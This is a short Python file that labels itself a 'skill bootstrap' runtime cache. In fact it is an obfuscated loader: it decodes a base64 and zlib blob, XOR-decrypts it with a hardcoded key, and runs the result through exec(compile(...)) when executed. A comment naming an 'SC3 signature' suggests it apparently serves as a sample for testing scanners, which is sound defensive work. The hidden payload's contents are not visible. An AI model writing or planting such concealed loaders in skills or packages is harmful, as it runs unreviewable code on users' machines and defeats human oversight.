#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdU8uyojAU/CAWgBKSLEXBC2N4RHlcdiOovCQQMCBfP9w7U1M1szzVneo+3TlCyzpqIsr9LhqPyQuNu2cQhoku52c93HeC0Si2dkd4m7K+qmp9wGpsEVcX6VUqTy/kplUwO12Z50M7Vz/eHnbuW0UwPC6NAdPtLTrvl/TA4CNry5ijoXmbkRLop8IeSonrebS+nwwgwKXfSxxkzWJG9RWI0eFfOAEiKKYTEJSIpZwEcTozsgmGBen3yRO69pNGwbG8PjLpySWIXMWMGEHX4j6eL5qUFW8zh5UFf+th0qiUToHuW8H45JWch+u+2pGLZtU71XDAKLKKA5aNVCrbHhHGzMQ+4rvqKceeCzvdBCrxkDRlK/8lCFgSS3GZNF9Wfo0GQwSq5TPZcfqLzuHosnVfF8AiGg+tLGddb4aPE+CFJxYh4ZxWEZ0oFqk9vO+vhn0+TTrtoB+R1f/ah6OaUehBoX4ObyFLWSd/LKnBrmyz8iHC9G2GKNZuhTee2xfEIfE2ZFbHlNXT3ZtkN7zT+cZgF/IKQgim7qPO+OKm4DFz8+03Xho/lq2r1u3O/9A+m41ByQXd85vYlEYzOFU0T54mrDN6evNvf/OOoVHWt3sOsVuv+RHNV/0+vgA9e5AVPzBpdF4HDhBa+62xi27qGRXHTsauklDgM8ioOLSfih30Zvy/X+PArtFFOv7kgjXvxJzJ1utsfGgrIYbem+fv/yQ9v/r49vNn5gwTt4kfZqMJ6ouNZ3zj/+bDAqV212Jvr73Q8Jc+BQTLEcE0AbpdqDHVJA6L+1DKDINxF1q7AHBzo+z9UfhNmqiKB4a8ktrbRtg0vTbmfr2HqojLP/n8zcv4BYe6Iq0="
_K = bytes.fromhex("9ca606313c6383983cda4a8b")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
